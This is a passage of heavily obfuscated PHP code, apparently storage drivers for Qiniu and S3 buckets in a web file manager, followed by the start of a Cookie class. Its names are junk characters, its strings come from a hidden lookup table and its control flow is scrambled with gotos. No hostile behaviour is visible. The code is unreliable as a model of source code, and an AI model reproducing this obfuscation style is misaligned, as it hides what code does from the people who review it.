($c·İ˜ˆÛù– === $D™‹§ÖŞ½[33]) { break; } } if ($b¹Ã®š·ÓÆ) { return array($D™‹§ÖŞ½[203] => $D—‹Ô‡ÖÌ, $D™‹§ÖŞ½[204] => $d‘¦ëî”¢»); } goto AÃ†ÖÜ›Ç; CÆˆ”««Ô¾: } public function listAll($Fñğ…„ù¿) { $fğ›æâù¾” =& $_SERVER[ÒÆ›ÆØÎ¾]; $dÀ¸¡‚ÑÓ = $this->fileList($Fñğ…„ù¿, $fğ›æâù¾”[33], !0); $D”¨‚³í®— = array(); foreach ($dÀ¸¡‚ÑÓ[$fğ›æâù¾”[74]] as $b¸“›‰“˜) { $D”¨‚³í®—[$b¸“›‰“˜[$fğ›æâù¾”[93]]] = $b¸“›‰“˜[$fğ›æâù¾”[78]]; } foreach ($dÀ¸¡‚ÑÓ[$fğ›æâù¾”[75]] as $b¸“›‰“˜) { if (is_string($b¸“›‰“˜)) { $D”¨‚³í®—[$b¸“›‰“˜] = 0; } } return $this->listAllFiles($Fñğ…„ù¿, array_keys($D”¨‚³í®—), $D”¨‚³í®—); } private function fileList($Dá»ÖÇßÙ¬, $E ˆÚ‚ÂŒ = '', $D¡É«±„Ü« = 0) { goto a¿ÊÉá„ôè; bÕ›­Öéï: return array($AÚ‚ÏéØƒ[75] => $F‡¢Ğ¡ËÓà, $AÚ‚ÏéØƒ[74] => $bê´½â¥ğ); goto dŠ±„ô¸Æ; Dğ‹µªÖ†ë: $F‡¢Ğ¡ËÓà = $bê´½â¥ğ = array(); while (!0) { check_abort(); list($AË®¯ßÓò, $FŞğÔÜø¾) = $this->bucketManager->listFiles($this->bucket, $Bá¹©õÌ£À, $A©¨‡æÒÀÜ, $A×•ƒÕˆîƒ, $E ˆÚ‚ÂŒ); if ($FŞğÔÜø¾) { break; } $A©¨‡æÒÀÜ = array_key_exists($AÚ‚ÏéØƒ[1265], $AË®¯ßÓò) ? $A©¨‡æÒÀÜ = $AË®¯ßÓò[$AÚ‚ÏéØƒ[1297]] : $AÚ‚ÏéØƒ[33]; $cË¼Û²†§‰ = isset($AË®¯ßÓò[$AÚ‚ÏéØƒ[1298]]) ? $AË®¯ßÓò[$AÚ‚ÏéØƒ[1298]] : array(); $AŒòÔ õçğ = isset($AË®¯ßÓò[$AÚ‚ÏéØƒ[1299]]) ? $AË®¯ßÓò[$AÚ‚ÏéØƒ[1299]] : array(); foreach ($cË¼Û²†§‰ as $Bˆˆ«ÊÉ¥) { goto d‰ŒµåØ²ø; d‰ŒµåØ²ø: if ($Bˆˆ«ÊÉ¥[$AÚ‚ÏéØƒ[93]] == $Bá¹©õÌ£À) { continue; } $fËïìŞ·‚ = $Bˆˆ«ÊÉ¥[$AÚ‚ÏéØƒ[93]]; $cÄª”ØË = $Bˆˆ«ÊÉ¥[$AÚ‚ÏéØƒ[1295]]; goto E‹«˜ç¸Ó‹; d³÷Œ†é‘Ş: if ($bÁÛ‚¼œˆÀ) { $F‡¢Ğ¡ËÓà[] = $fËïìŞ·‚; continue; } $bê´½â¥ğ[] = $D¡É«±„Ü« ? $Bˆˆ«ÊÉ¥ : $fËïìŞ·‚; goto DÄ¾Œ³©ğ; E‹«˜ç¸Ó‹: $Bˆˆ«ÊÉ¥[$AÚ‚ÏéØƒ[78]] = $cÄª”ØË; $bÁÛ‚¼œˆÀ = $cÄª”ØË == 0 && substr($fËïìŞ·‚, strlen($fËïìŞ·‚) - 1, 1) == $AÚ‚ÏéØƒ[8] ? !0 : !1; if ($bŞ”¢µÅ‚ñ) { $this->cacheMethod($AÚ‚ÏéØƒ[199], $fËïìŞ·‚, $bÁÛ‚¼œˆÀ); $this->cacheMethod($AÚ‚ÏéØƒ[200], $fËïìŞ·‚, $Bˆˆ«ÊÉ¥); } goto d³÷Œ†é‘Ş; DÄ¾Œ³©ğ: } foreach ($AŒòÔ õçğ as $fËïìŞ·‚) { if ($fËïìŞ·‚ == $Bá¹©õÌ£À) { continue; } $F‡¢Ğ¡ËÓà[] = $fËïìŞ·‚; if ($bŞ”¢µÅ‚ñ) { $this->cacheMethod($AÚ‚ÏéØƒ[199], $fËïìŞ·‚, !0); } } if ($A©¨‡æÒÀÜ === $AÚ‚ÏéØƒ[33]) { break; } } if ($bŞ”¢µÅ‚ñ) { $this->cacheMethod($AÚ‚ÏéØƒ[199], $Dá»ÖÇßÙ¬, !0); } goto bÕ›­Öéï; a¿ÊÉá„ôè: $AÚ‚ÏéØƒ =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dá»ÖÇßÙ¬ = trim($Dá»ÖÇßÙ¬, $AÚ‚ÏéØƒ[8]); $Bá¹©õÌ£À = empty($Dá»ÖÇßÙ¬) && $Dá»ÖÇßÙ¬ !== $AÚ‚ÏéØƒ[191] ? $AÚ‚ÏéØƒ[33] : $Dá»ÖÇßÙ¬ . $AÚ‚ÏéØƒ[8]; goto F‚¬«ŒµÒ¯; F‚¬«ŒµÒ¯: $A©¨‡æÒÀÜ = $AÚ‚ÏéØƒ[33]; $A×•ƒÕˆîƒ = 1000; $bŞ”¢µÅ‚ñ = $this->listItemCache === !1 ? !1 : !0; goto Dğ‹µªÖ†ë; dŠ±„ô¸Æ: } public function canRead($BŸ™‰é¶…ß) { return $this->exist($BŸ™‰é¶…ß) ? !0 : !1; } public function canWrite($ağ™«•…›è) { return $this->exist($ağ™«•…›è) ? !0 : !1; } public function getContent($c¶¨í•“È³) { return $this->fileSubstr($c¶¨í•“È³, 0, -1); } public function setContent($C¿ìÇ§Šäè, $FÍõËÅ‡ = '') { $eÓßŸóçí» = $this->tempFile($this->pathThis($C¿ìÇ§Šäè)); file_put_contents($eÓßŸóçí», $FÍõËÅ‡); if ($this->upload($C¿ìÇ§Šäè, $eÓßŸóçí»)) { $this->tempFileRemve($eÓßŸóçí»); return !0; } return !1; } public function refreshUrls($B—Øéˆ…è) { goto C×ƒ‡Ò; cŸœßÀ¼¢š: return $cÕÀğËÒ[$F‡í†ç•ÍÑ[1069]] == $F‡í†ç•ÍÑ[712] ? !0 : !1; goto DÔÆÀ‰ˆ‰«; f«Ó÷‰‘½: $cãñÀòÅøŠ = new Qiniu\Cdn\CdnManager($this->auth); list($cÕÀğËÒ, $fÉŒ½Îƒ¢†) = $cãñÀòÅøŠ->refreshUrls($eÚ©¸àÊ•ª); if ($fÉŒ½Îƒ¢†) { return !1; } goto cŸœßÀ¼¢š; C×ƒ‡Ò: $F‡í†ç•ÍÑ =& $_SERVER[ÒÆ›ÆØÎ¾]; $eÚ©¸àÊ•ª = array(); if (is_array($B—Øéˆ…è)) { foreach ($B—Øéˆ…è as $b¥Ç‡ºº©÷) { $eÚ©¸àÊ•ª[] = $this->link($b¥Ç‡ºº©÷); } } else { $eÚ©¸àÊ•ª[] = $this->link($B—Øéˆ…è); } goto f«Ó÷‰‘½; DÔÆÀ‰ˆ‰«: } public function fileSubstr($BŞòÔ¦èéØ, $Bòë„İ‚é, $fè˜ïÊ¼Ğ‘) { $dÄš­¢ÏğÓ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!($d‚†Ûİ„ = $this->link($BŞòÔ¦èéØ))) { return !1; } $dŞğÍõ’Ÿì = !1; if ($fè˜ïÊ¼Ğ‘ > 0) { $F‹¾Âí•î = $Bòë„İ‚é + $fè˜ïÊ¼Ğ‘ - 1; $dŞğÍõ’Ÿì = array($dÄš­¢ÏğÓ[1300] . $Bòë„İ‚é . $dÄš­¢ÏğÓ[440] . $F‹¾Âí•î); } $cµ…½á›‰Ö = url_request($d‚†Ûİ„, $dÄš­¢ÏğÓ[228], !1, $dŞğÍõ’Ÿì); return $cµ…½á›‰Ö[$dÄš­¢ÏğÓ[702]] ? $cµ…½á›‰Ö[$dÄš­¢ÏğÓ[1079]] : !1; } public function upload($bª¬ÁÊ‹³¦, $cÅŠ—óí·È, $eŠ¯‚ÆëñÒ = false, $eÄ“”å§Ú‡ = REPEAT_REPLACE) { $fÌƒ°¶øó = new Qiniu\Storage\UploadManager(); $A‘ğ•¡ãÜó = $this->auth->uploadToken($this->bucket, $bª¬ÁÊ‹³¦); $DÊÈãÒ˜™ˆ = get_file_mime(get_path_ext($cÅŠ—óí·È)); list($BÄ“–‘º¦è, $b„‚ºÊ¹ùî) = $fÌƒ°¶øó->putFile($A‘ğ•¡ãÜó, $bª¬ÁÊ‹³¦, $cÅŠ—óí·È, null, $DÊÈãÒ˜™ˆ); return $b„‚ºÊ¹ùî ? !1 : $this->getPathOuter($bª¬ÁÊ‹³¦); } public function uploadFormData($dµ˜»†ºÀ, $b”Š¡‚Æ¹È = 3600) { return $this->uploadToken($dµ˜»†ºÀ, $b”Š¡‚Æ¹È); } public function multiUploadFormData($fƒŒÎ£¬æ°, $cíĞä±Û”Ï = 3600) { return $this->uploadToken($fƒŒÎ£¬æ°, $cíĞä±Û”Ï); } private function uploadToken($fâ¶ô‡­Ú, $Ağ¹ÂÑåŠ¿ = 3600) { goto EÙİã†ò°Í; C½Ş’‹·º¨: $a¢Õ«…Ğ¬§ = http_type() . "\72\x2f\x2f\x75\160\x6c\x6f\x61\x64{$D–Â™™³}\x2e\161\151\x6e\x69\x75\x70\x2e\143\x6f\155\57"; return array($Bß¶èÜ×Œ[1304] => $B³¤ÚÛ»êÕ, $Bß¶èÜ×Œ[1305] => $a¢Õ«…Ğ¬§); goto b’ÏÀÓ¨ì; EÙİã†ò°Í: $Bß¶èÜ×Œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $DˆÍÕÚ¿õà = $Ağ¹ÂÑåŠ¿; $BëÄ½í‡Á„ = array($Bß¶èÜ×Œ[1301] => $Bß¶èÜ×Œ[1302]); goto aİ›‹ğéŒ; aİ›‹ğéŒ: $a¤¨»½‡°÷ = $fâ¶ô‡­Ú; $B³¤ÚÛ»êÕ = $this->auth->uploadToken($this->bucket, $a¤¨»½‡°÷, $DˆÍÕÚ¿õà, $BëÄ½í‡Á„, !0); $D–Â™™³ = empty($this->region) || $this->region == $Bß¶èÜ×Œ[1303] ? $Bß¶èÜ×Œ[33] : $Bß¶èÜ×Œ[440] . $this->region; goto C½Ş’‹·º¨; b’ÏÀÓ¨ì: } public function download($CåÙÄ¦ÔùÊ, $D¿ÃºÕÁ) { goto aÍ´Ìïˆß‰; aÍ´Ìïˆß‰: $bÕ–ù‚÷î¾ = IO::getPathInner(IO::mkfile($D¿ÃºÕÁ)); if (!($E²÷ïË”«« = $this->link($CåÙÄ¦ÔùÊ))) { return !1; } $c¢í¤‹ã‘ = 0; goto fœòÃ£…Š; fœòÃ£…Š: $C©ËææòÔ = 1024 * 200; $F³ÆâàĞé± = fopen($bÕ–ù‚÷î¾, $_SERVER[ÒÆ›ÆØÎ¾][1306]); while (!0) { $eìö™®¡‹ = $this->fileSubstr($CåÙÄ¦ÔùÊ, $c¢í¤‹ã‘, $C©ËææòÔ); if ($eìö™®¡‹ === !1) { return !1; } fwrite($F³ÆâàĞé±, $eìö™®¡‹); $c¢í¤‹ã‘ += $C©ËææòÔ; if (strlen($eìö™®¡‹) < $C©ËææòÔ) { break; } } goto bËÀóá…Û; bËÀóá…Û: fclose($F³ÆâàĞé±); return $D¿ÃºÕÁ; goto eƒ¨ª©µï—; eƒ¨ª©µï—: } public function link($fœ©…¤ÑŞ‘, $f½¤‰™Ï–ª = '') { if (!$this->isFile($fœ©…¤ÑŞ‘)) { return !1; } $cù®µ’ÈŒñ = $this->getHost() . $_SERVER[ÒÆ›ÆØÎ¾][8] . $this->pathEncode($fœ©…¤ÑŞ‘) . $f½¤‰™Ï–ª; return $this->auth->privateDownloadUrl($cù®µ’ÈŒñ, 3600 * 12); } public function fileOut($BÏØÆÖñ¨‡, $Eæç…¨¹Ø = false, $a²ïŸ„œ‡¸ = false, $AóÆÊ¦­Š = '') { $aÍã¤Ï…à =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->isFileOutServer()) { return $this->fileOutServer($BÏØÆÖñ¨‡, $Eæç…¨¹Ø, $a²ïŸ„œ‡¸, $AóÆÊ¦­Š); } if (!$a²ïŸ„œ‡¸) { $a²ïŸ„œ‡¸ = $this->pathThis($BÏØÆÖñ¨‡); } $C¤ãâŸ–Ùí = $Eæç…¨¹Ø ? $aÍã¤Ï…à[1307] . rawurlencode($a²ïŸ„œ‡¸) : $aÍã¤Ï…à[33]; $DÇì÷³«î = $this->link($BÏØÆÖñ¨‡, $C¤ãâŸ–Ùí); $this->fileOutLink($DÇì÷³«î); } public function fileOutServer($dÛôöœ»ÎÅ, $bàÏŒ­Ç·æ = false, $d¸¿…Š‹³ = false, $Fƒˆºø—Õ¯ = '') { parent::fileOut($dÛôöœ»ÎÅ, $bàÏŒ­Ç·æ, $d¸¿…Š‹³, $Fƒˆºø—Õ¯); } public function fileOutImage($b¢æ¹ ¨í©, $CÈöÒÁ²ÖÔ = 250) { $AË†Ï–ŞŒÅ = $this->link($b¢æ¹ ¨í©, $_SERVER[ÒÆ›ÆØÎ¾][1308] . $CÈöÒÁ²ÖÔ); $this->fileOutLink($AË†Ï–ŞŒÅ); } public function fileOutImageServer($A¿Èå”ªóŠ, $A‘¯…èÈ§È = 250) { parent::fileOutImage($A¿Èå”ªóŠ, $A‘¯…èÈ§È); } public function hashMd5($d†¤Ğ·¢õ¦) { $EˆÉÍíºà =& $_SERVER[ÒÆ›ÆØÎ¾]; $c¡©âÓˆ­ğ = $this->objectMeta($d†¤Ğ·¢õ¦); return isset($c¡©âÓˆ­ğ[$EˆÉÍíºà[208]]) ? $c¡©âÓˆ­ğ[$EˆÉÍíºà[208]] : !1; $B ¼Ğõç¬Ô = $this->link($d†¤Ğ·¢õ¦, $EˆÉÍíºà[1309]); } public function size($cÀ‰Œ‡äù) { $F…ˆè•ø² = $this->objectMeta($cÀ‰Œ‡äù); return $F…ˆè•ø² ? $F…ˆè•ø²[$_SERVER[ÒÆ›ÆØÎ¾][78]] : 0; } public function info($C½Öèœæ‹º) { if ($this->isFolder($C½Öèœæ‹º)) { return $this->folderInfo($C½Öèœæ‹º); } else { if ($this->isFile($C½Öèœæ‹º)) { return $this->fileInfo($C½Öèœæ‹º); } } return !1; } public function exist($EÄµÜîÇªĞ) { return $this->isFile($EÄµÜîÇªĞ) || $this->isFolder($EÄµÜîÇªĞ); } public function isFile($c°Ü‚¨å¶‡) { return !$this->isFolder($c°Ü‚¨å¶‡) && $this->objectMeta($c°Ü‚¨å¶‡); } public function isFolder($aåºŸ®«÷÷) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][199], $aåºŸ®«÷÷); } protected function objectMeta($e²‰ŒóÌ‘) { return $this->cacheMethod($_SERVER[ÒÆ›ÆØÎ¾][200], $e²‰ŒóÌ‘); } protected function _objectMeta($c–®÷—×ğ) { $DÄÍî­¬Ò­ =& $_SERVER[ÒÆ›ÆØÎ¾]; list($BñêÎÌ¤ËÑ, $dÇÀò¹¸ğ) = $this->bucketManager->stat($this->bucket, $c–®÷—×ğ); if ($BñêÎÌ¤ËÑ) { $BñêÎÌ¤ËÑ[$DÄÍî­¬Ò­[78]] = intval($BñêÎÌ¤ËÑ[$DÄÍî­¬Ò­[1295]]); } return $BñêÎÌ¤ËÑ; } protected function _isFolder($aíñËğæ‡à) { $Aä©ğ¸ÅÁ© =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($aíñËğæ‡à == $Aä©ğ¸ÅÁ©[33] || $aíñËğæ‡à == $Aä©ğ¸ÅÁ©[8]) { return !0; } list($B¬¿…èî³Ú, $A ÷Ôááô©) = $this->bucketManager->listFiles($this->bucket, trim($aíñËğæ‡à, $Aä©ğ¸ÅÁ©[8]) . $Aä©ğ¸ÅÁ©[8], $Aä©ğ¸ÅÁ©[33], 1, $Aä©ğ¸ÅÁ©[8]); return !empty($B¬¿…èî³Ú[$Aä©ğ¸ÅÁ©[1298]]) || !empty($B¬¿…èî³Ú[$Aä©ğ¸ÅÁ©[1299]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($c‰á™öÑ™) { parent::__construct($c‰á™öÑ™); } public function uploadFormData($BÙëİ‚Ÿ™â, $cÇ¨²’ÏÍÓ = 3600) { goto CÍà½ÁœÒä; b—Š›Ú¬: $cÙÕŠòæ…· = $bºñéÎÇ[59]; $b«ª©‡óÌÈ = gmdate($bºñéÎÇ[1216]); $Eá©Ïğ¾»è = gmdate($bºñéÎÇ[703]); goto e®©Áğª; EêßÎ¦„™: $cŸÂ³éâ­Û = hash_hmac($bºñéÎÇ[1225], $cÙÕŠòæ…·, $f¿íøÉ­èØ, !0); $F‚±•Ä…‰ = hash_hmac($bºñéÎÇ[1225], $Cßöç–ã³, $cŸÂ³éâ­Û, !0); $däÈîèäÕÇ = hash_hmac($bºñéÎÇ[1225], $FÚöÆÇ˜Ç¹, $F‚±•Ä…‰); goto BÎå—¡ØÀò; BÎå—¡ØÀò: $a¢‚ˆàÁ® = array($bºñéÎÇ[211] => $bºñéÎÇ[33], $bºñéÎÇ[1227] => $bºñéÎÇ[33], $bºñéÎÇ[1184] => $e¥íâèôåó, $bºñéÎÇ[1188] => $BéµÍ·»ï, $bºñéÎÇ[1192] => $FÚöÆÇ˜Ç¹, $bºñéÎÇ[1228] => $f»§íóº¢Ê, $bºñéÎÇ[1229] => $DÛ¿ñÉ¥‡, $bºñéÎÇ[1230] => $b«ª©‡óÌÈ, $bºñéÎÇ[1231] => $D£®†é¼É, $bºñéÎÇ[1232] => $däÈîèäÕÇ, $bºñéÎÇ[175] => $this->getHost()); return $a¢‚ˆàÁ®; goto e‚Ç”Ş›ø‹; CÍà½ÁœÒä: $bºñéÎÇ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e¥íâèôåó = $bºñéÎÇ[192]; $DÛ¿ñÉ¥‡ = $bºñéÎÇ[1215]; goto b—Š›Ú¬; f‚‰±¸¾„: $b¶æŸùŠŠ° = array($this->accessKey, $Eá©Ïğ¾»è, $this->region, $cÙÕŠòæ…·, $Cßöç–ã³); $f»§íóº¢Ê = implode($bºñéÎÇ[8], $b¶æŸùŠŠ°); $DÕ­ˆ‘ôèŞ = array($bºñéÎÇ[1182] => gmdate($bºñéÎÇ[1181], strtotime($bºñéÎÇ[1218])), $bºñéÎÇ[1183] => array(array($bºñéÎÇ[1185] => $this->bucket), array($bºñéÎÇ[1184] => $e¥íâèôåó), array($bºñéÎÇ[1186], $bºñéÎÇ[1187], $bºñéÎÇ[33]), array($bºñéÎÇ[1186], $bºñéÎÇ[1219], $bºñéÎÇ[33]), array($bºñéÎÇ[1186], $bºñéÎÇ[1220], $bºñéÎÇ[33]), array($bºñéÎÇ[1188] => $BéµÍ·»ï), array($bºñéÎÇ[1221] => $f»§íóº¢Ê), array($bºñéÎÇ[1222] => $DÛ¿ñÉ¥‡), array($bºñéÎÇ[1223] => $b«ª©‡óÌÈ), array($bºñéÎÇ[1224] => $D£®†é¼É))); goto fµŒ„ÑÜ»ë; fµŒ„ÑÜ»ë: $FÚöÆÇ˜Ç¹ = base64_encode(json_encode($DÕ­ˆ‘ôèŞ)); $F¯«…Íå¶Š = hash_hmac($bºñéÎÇ[1225], $Eá©Ïğ¾»è, $bºñéÎÇ[1226] . $this->secret, !0); $f¿íøÉ­èØ = hash_hmac($bºñéÎÇ[1225], $this->region, $F¯«…Íå¶Š, !0); goto EêßÎ¦„™; e®©Áğª: $Cßöç–ã³ = $bºñéÎÇ[1217]; $D£®†é¼É = $cÇ¨²’ÏÍÓ . $bºñéÎÇ[33]; $BéµÍ·»ï = $bºñéÎÇ[1180]; goto f‚‰±¸¾„; e‚Ç”Ş›ø‹: } public function multiUploadFormData($bßî†¶¥°«, $BÊáŠëŸÉ‡ = 3600) { $cŠò§œ•«Œ =& $_SERVER[ÒÆ›ÆØÎ¾]; $F½œÈ‘½¹ = gmdate($cŠò§œ•«Œ[1310]); $BËÜàÈ°İ = array(); $A¡ùéâàµÀ = $this->client->getUploadId($this->bucket, $bßî†¶¥°«, $BËÜàÈ°İ); if (!$A¡ùéâàµÀ) { return !1; } return array($cŠò§œ•«Œ[221] => $A¡ùéâàµÀ, $cŠò§œ•«Œ[175] => $this->getHost() . $cŠò§œ•«Œ[8] . $this->pathEncode($bßî†¶¥°«), $cŠò§œ•«Œ[222] => $F½œÈ‘½¹, $cŠò§œ•«Œ[93] => $bßî†¶¥°«); } public function multiUploadAuthData($e‰Ûœ°Ô³¼, $c¹Àğì—‚Œ = array()) { goto FèÜñœˆŒ³; FèÜñœˆŒ³: $dÆ‡ôß×¡¶ =& $_SERVER[ÒÆ›ÆØÎ¾]; $aĞ©ø˜Ä­ = isset($c¹Àğì—‚Œ[$dÆ‡ôß×¡¶[168]]) ? $c¹Àğì—‚Œ[$dÆ‡ôß×¡¶[168]] : $dÆ‡ôß×¡¶[33]; $B”ÜÄ•¬’„ = $c¹Àğì—‚Œ[$dÆ‡ôß×¡¶[93]]; goto BøôŒí¼Ñ; AÑÕàÂôöè: if (strpos($aĞ©ø˜Ä­, $dÆ‡ôß×¡¶[225]) === 0) { if (isset($aöâòÀ’õò[$dÆ‡ôß×¡¶[1312]])) { $FŞ¢ÄÂ¸äº = $aöâòÀ’õò[$dÆ‡ôß×¡¶[1312]]; } else { if (isset($aøµÄĞ…ï[$dÆ‡ôß×¡¶[1312]])) { $FŞ¢ÄÂ¸äº = $aøµÄĞ…ï[$dÆ‡ôß×¡¶[1312]]; } else { $FŞ¢ÄÂ¸äº = hash($dÆ‡ôß×¡¶[1225], $dÆ‡ôß×¡¶[33]); } } return array($dÆ‡ôß×¡¶[232] => $aøµÄĞ…ï[$dÆ‡ôß×¡¶[232]], $dÆ‡ôß×¡¶[1312] => $FŞ¢ÄÂ¸äº, $dÆ‡ôß×¡¶[222] => $aøµÄĞ…ï[$dÆ‡ôß×¡¶[1315]]); } return $aøµÄĞ…ï[$dÆ‡ôß×¡¶[232]]; goto bø™©îåÙÊ; BøôŒí¼Ñ: unset($c¹Àğì—‚Œ[$dÆ‡ôß×¡¶[93]]); if (isset($c¹Àğì—‚Œ[$dÆ‡ôß×¡¶[223]])) { return $this->listUploadParts($B”ÜÄ•¬’„, $c¹Àğì—‚Œ); } $aöâòÀ’õò = array(); goto c‘•¿åÃŠº; bñå‚¸–: $F»Ä°„Õ´Ê = $dÆ‡ôß×¡¶[226]; $B•‹…Œ•ƒô = $dÆ‡ôß×¡¶[8] . $this->pathEncode($B”ÜÄ•¬’„) . $aĞ©ø˜Ä­; $aøµÄĞ…ï = $this->client->__getSignatureV4($aöâòÀ’õò, $b Õ”ö„Ï, $F»Ä°„Õ´Ê, $B•‹…Œ•ƒô); goto AÑÕàÂôöè; c‘•¿åÃŠº: if (isset($c¹Àğì—‚Œ[$dÆ‡ôß×¡¶[1311]])) { $aöâòÀ’õò[$dÆ‡ôß×¡¶[1312]] = $c¹Àğì—‚Œ[$dÆ‡ôß×¡¶[1311]]; } $f‚†—«Æ¦ = explode($dÆ‡ôß×¡¶[177], $this->getHost()); $b Õ”ö„Ï = array($dÆ‡ôß×¡¶[1313] => $f‚†—«Æ¦[1], $dÆ‡ôß×¡¶[1314] => $dÆ‡ôß×¡¶[33], $dÆ‡ôß×¡¶[211] => $dÆ‡ôß×¡¶[119], $dÆ‡ôß×¡¶[1227] => $c¹Àğì—‚Œ[$dÆ‡ôß×¡¶[78]]); goto bñå‚¸–; bø™©îåÙÊ: } public function listUploadParts($FÚ´—åÈˆ“, $Fáì¾»â«õ = array()) { goto AäÑÄ„†; DÛŒ’ø„Ó: if (!$EæßŞÒĞàğ) { return !1; } $c±Ã¨–ƒÍ = $DÆ¶…¬Ê[1316]; foreach ($EæßŞÒĞàğ as $fË‰àªÍ†) { $c±Ã¨–ƒÍ .= $DÆ¶…¬Ê[1317] . "\74\120\141\162\164\x4e\165\x6d\142\145\162\x3e{$fË‰àªÍ†[$DÆ¶…¬Ê[1272]]}\74\x2f\x50\141\x72\164\x4e\x75\x6d\142\x65\162\x3e\12" . "\x3c\105\x54\x61\147\76{$fË‰àªÍ†[$DÆ¶…¬Ê[1273]]}\74\x2f\105\124\141\x67\76\xa" . $DÆ¶…¬Ê[1318]; } goto c§‡®§†ØŠ; AäÑÄ„†: $DÆ¶…¬Ê =& $_SERVER[ÒÆ›ÆØÎ¾]; $a¹¬ÀÁ«†Á = str_replace($DÆ¶…¬Ê[233], $DÆ¶…¬Ê[33], $Fáì¾»â«õ[$DÆ¶…¬Ê[168]]); $EæßŞÒĞàğ = $this->client->listParts($this->bucket, $FÚ´—åÈˆ“, $a¹¬ÀÁ«†Á); goto DÛŒ’ø„Ó; c§‡®§†ØŠ: $c±Ã¨–ƒÍ .= $DÆ¶…¬Ê[1319]; $d†‚£ºĞ˜„ = array(); $Aïøƒ®Ûõ¶ = explode($DÆ¶…¬Ê[177], $this->getHost()); goto EˆõŠ°èè; BÜãœİ ß: $fÏ ÖÛÕœ = $this->client->__getSignatureV4($d†‚£ºĞ˜„, $Bã×±³ôœ, $b¥ÆÀ¤Âå‹, $b·×Ë¨ØÔŒ, $c±Ã¨–ƒÍ); return array($DÆ¶…¬Ê[232] => $fÏ ÖÛÕœ[$DÆ¶…¬Ê[232]], $DÆ¶…¬Ê[222] => $fÏ ÖÛÕœ[$DÆ¶…¬Ê[1315]], $DÆ¶…¬Ê[234] => $EæßŞÒĞàğ, $DÆ¶…¬Ê[1312] => $fÏ ÖÛÕœ[$DÆ¶…¬Ê[1312]]); goto Cìˆ¹Šâ†×; EˆõŠ°èè: $Bã×±³ôœ = array($DÆ¶…¬Ê[1313] => $Aïøƒ®Ûõ¶[1], $DÆ¶…¬Ê[211] => $DÆ¶…¬Ê[119], $DÆ¶…¬Ê[1227] => strlen($c±Ã¨–ƒÍ)); $b¥ÆÀ¤Âå‹ = $DÆ¶…¬Ê[224]; $b·×Ë¨ØÔŒ = $DÆ¶…¬Ê[8] . $this->pathEncode($FÚ´—åÈˆ“) . $Fáì¾»â«õ[$DÆ¶…¬Ê[168]]; goto BÜãœİ ß; Cìˆ¹Šâ†×: } public function link($cŠåäÒ»·, $EìÒÅ§×… = array()) { return parent::link($cŠåäÒ»·, $EìÒÅ§×…); } public function fileOut($B´ŠÙ´İÏ, $C„³Ñ‘×Ó„ = false, $fÆÑ‘í¸· = false, $A©ë„ÁÎ·´ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[ÒÆ›ÆØÎ¾][1320])) { return parent::fileOutServer($B´ŠÙ´İÏ, $C„³Ñ‘×Ó„, $fÆÑ‘í¸·, $A©ë„ÁÎ·´); } parent::fileOut($B´ŠÙ´İÏ, $C„³Ñ‘×Ó„, $fÆÑ‘í¸·, $A©ë„ÁÎ·´); } public function fileOutImage($f¦Ö›‹ÓŠ, $fÚ„Ç®ÏŠ = 250) { if (strstr($this->endpoint, $_SERVER[ÒÆ›ÆØÎ¾][1320])) { return parent::fileOutImageServer($f¦Ö›‹ÓŠ, $fÚ„Ç®ÏŠ); } parent::fileOutImage($f¦Ö›‹ÓŠ, $fÚ„Ç®ÏŠ); } public function fileOutLink($Fº™Ÿ±±Ú–) { $F³àƒŒ’¥ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (substr($Fº™Ÿ±±Ú–, 0, 7) == $F³àƒŒ’¥[1195]) { $Fº™Ÿ±±Ú– = $F³àƒŒ’¥[1196] . substr($Fº™Ÿ±±Ú–, 7); } header($F³àƒŒ’¥[159] . $Fº™Ÿ±±Ú–); die; } public function getHost() { $B’Òéš•ßÖ =& $_SERVER[ÒÆ›ÆØÎ¾]; $fí¢âªÛŒË = str_rtrim(parent::getHost(), $B’Òéš•ßÖ[8] . $this->bucket); $fí¢âªÛŒË = explode($B’Òéš•ßÖ[177], $fí¢âªÛŒË); return $fí¢âªÛŒË[0] . $B’Òéš•ßÖ[177] . $this->bucket . $B’Òéš•ßÖ[95] . $fí¢âªÛŒË[1]; } } goto eÌàæÉÙ Ï; b’Ôˆæ§âÒ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($eçôÂõï†© = '', $dó‰’‹‡ùø = 0) { if (is_string($eçôÂõï†©) && $eçôÂõï†© != $_SERVER[ÒÆ›ÆØÎ¾][33]) { $this->prefix = $eçôÂõï†©; } if (is_numeric($dó‰’‹‡ùø) && $dó‰’‹‡ùø > 0) { $this->expire = $dó‰’‹‡ùø; } } public static function getInstance() { static $cÑÈğô¾”ß; if ($cÑÈğô¾”ß === null) { $cÑÈğô¾”ß = new self(); } return $cÑÈğô¾”ß; } private static $cookieDisable = false; public static function disable($Eİ˜”òèß) { self::$cookieDisable = $Eİ˜”òèß; } private static $sameCookieSet = array(); public static function set($cÃ„ÖåêŸ–, $d©ÆŸ„²„ù, $F„‰”Ó‰÷Œ = 0, $bİ‰ØÀ¸‡¡ = false, $aÂŠ¢º²÷Ï = false) { goto C„åœä»›ñ; C„åœä»›ñ: $D¶ÕÙé÷‡¤ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (self::$cookieDisable) { return; } if (!$F„‰”Ó‰÷Œ) { $F„‰”Ó‰÷Œ = 24 * 3600 * 7; } goto E´ªÙÅ†ï‘; E´ªÙÅ†ï‘: if (isset(self::$sameCookieSet[$cÃ„ÖåêŸ–]) && self::$sameCookieSet[$cÃ„ÖåêŸ–] == $d©ÆŸ„²„ù . $F„‰”Ó‰÷Œ) { return; } self::$sameCookieSet[$cÃ„ÖåêŸ–] = $d©ÆŸ„²„ù . $F„‰”Ó‰÷Œ; if (!$aÂŠ¢º²÷Ï) { $aÂŠ¢º²÷Ï = str_replace(HOST, $D¶ÕÙé÷‡¤[33], APP_HOST); $aÂŠ¢º²÷Ï = _get($GLOBALS, $D¶ÕÙé÷‡¤[835], $aÂŠ¢º²÷Ï); } goto fãóì§œ›ì; 